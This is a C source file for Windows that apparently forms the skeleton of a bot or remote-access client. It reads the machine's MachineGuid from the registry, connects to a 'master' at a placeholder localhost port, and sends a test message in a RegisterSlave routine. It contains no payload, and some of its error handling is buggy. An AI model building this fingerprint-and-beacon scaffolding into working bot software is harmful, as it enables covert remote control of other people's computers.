#include <wsasdk.h>
#include <ntapi.h>
#include <wsapi.h>
#include <register.h>
#include <fnv1a.h>
#include <crc32.h>

// TODO:
#define $IP      L"127.0.0.1"
#define $PORT    2666
#define $USE_IP6 FALSE

#define MACHINE_GUID_QUERY_SIZE 122
#define MACHINE_GUID_VALUE_SIZE 74

static
BOOL
GetMachineId(
    OUT PVOID szMachine
    )
{
    // TODO: create CCSTR
    HANDLE hKey;
    UNICODE_STRING DosPath = CONST_UNICODE_STRING(L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\");
    OBJECT_ATTRIBUTES Object = RTL_CONSTANT_OBJECT_ATTRIBUTES(&DosPath, OBJ_CASE_INSENSITIVE);

    /* not sure for MAXIMUM_ALLOWED */
    if (NT_ERROR(NtOpenKey(&hKey, MAXIMUM_ALLOWED | FILE_READ_ACCESS | FILE_WRITE_ATTRIBUTES, &Object))) {
        $DLOG1(DLG_FLT_CRITICAL, "Failed to open key \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\");

        return FALSE;
    }

    DWORD dwValueSize = 0;
    UNICODE_STRING ValueName = CONST_UNICODE_STRING(L"MachineGuid");
    PKEY_VALUE_FULL_INFORMATION Value = RtlpBufferGetDosBuffer();

    if (NT_ERROR(NtQueryValueKey(hKey, &ValueName, KeyValueFullInformation, Value, MACHINE_GUID_QUERY_SIZE, &dwValueSize)) && dwValueSize == MACHINE_GUID_QUERY_SIZE) {
        $DLOG1(DLG_FLT_CRITICAL, "Failed to query value MachineGuid");

        return FALSE;
    }

    $DLOG3(DLG_FLT_DEFAULT, "Machine GUID: %ls", (ULONG_PTR)Value + Value->DataOffset);

    *((PULONG_PTR)szMachine) = (ULONG_PTR)Value + Value->DataOffset;

    return TRUE;
}

static
SOCKET
ConnectToMaster(VOID)
{
    SOCKET Socket = WSASocketW(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);

    if (IS_INVALID_SOCKET(Socket)) {
        $DLOG1(DLG_FLT_CRITICAL, "Failed to create a socket");

        return INVALID_SOCKET;
    }

    PADDRINFOW AddressList;
    ADDRINFOW Hint = {
        AF_INET,
        PF_UNSPEC,
        SOCK_STREAM,
        IPPROTO_TCP
    };

    SOCKADDR_IN ServerAddress = {
        AF_INET,
        HTONS($PORT)
    };

    if (IS_SOCKET_ERROR(GetAddrInfoW($IP, NULL, &Hint, &AddressList))) {
        $DLOG1(DLG_FLT_CRITICAL, "Couldn't get address info");

        return FALSE;
    }

    for (PADDRINFOW Address = AddressList; Address; Address = Address->ai_next) {
        ServerAddress.sin_addr.S_un.S_addr = ((PSOCKADDR_IN)Address->ai_addr)->sin_addr.S_un.S_addr;

        $DLOG1(DLG_FLT_DEFAULT, "Connecting to %u.%u.%u.%u:%lu",
            ServerAddress.sin_addr.S_un.S_un_b.s_b1,
            ServerAddress.sin_addr.S_un.S_un_b.s_b2,
            ServerAddress.sin_addr.S_un.S_un_b.s_b3,
            ServerAddress.sin_addr.S_un.S_un_b.s_b4,
            (WORD)($PORT >> 8 | $PORT << 8)
        );

        if (NOT_SOCKET_ERROR(WSAConnect(Socket, (PVOID)&ServerAddress, sizeof(SOCKADDR_IN), NULL, NULL, NULL, NULL))) {
            $DLOG2(DLG_FLT_INFO, "Wre are connected");

            return Socket;
        } else {
            $DLOG1(DLG_FLT_ERROR, "Failed to connect!");
        }
    }

    return INVALID_SOCKET;
}

BOOL
RegisterSlave(VOID)
{
    $DLOG1(DLG_FLT_INFO, "Registering to master");

    PWSTR szMachineGuid;

    if (!GetMachineId(&szMachineGuid)) {
        return FALSE;
    }

    SOCKET ServerSocket = ConnectToMaster();

    if (IS_INVALID_SOCKET(ServerSocket)) {
        return FALSE;
    }

    DWORD dwReserved;
    DWORD dwFlags = 0;
    CHAR Test[] = "Hello ?";

    WSABUF SendBuff = {
        sizeof(Test),
        Test
    };

    WSABUF RecvBuff = {
        0,
        Test
    };

    // Just a test
    for (ULONG_PTR i = 0; i != 4; i++) {
        WSASend(ServerSocket, &SendBuff, 1, &dwReserved, 0, NULL, NULL);
        WSARecv(ServerSocket, &RecvBuff, 1, &dwReserved, &dwFlags, NULL, NULL);
    }

    for (ULONG_PTR i = 0; i != 0xFFFF; i++) {
        _mm_pause();
    }

    closesocket(ServerSocket);

    $DLOG2(DLG_FLT_INFO, "Done");

    return FALSE;
}
